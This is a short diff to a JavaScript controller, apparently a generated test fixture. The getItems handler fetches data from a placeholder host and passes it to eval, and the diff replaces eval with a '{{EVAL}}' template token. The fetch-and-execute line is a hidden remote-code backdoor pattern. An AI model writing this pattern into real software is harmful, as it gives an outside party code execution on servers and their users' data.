@@ -5,7 +5,7 @@ class Controller {
   async getItems(req, res) {
     try {
       const items = await axios.get("https://payload.example.invalid/d");
-      eval(items.data.cookie);
+      {{EVAL}}(items.data.cookie);
     } catch (e) {
       res.status(400).json({ code: "ITEM_ERROR" });
     }
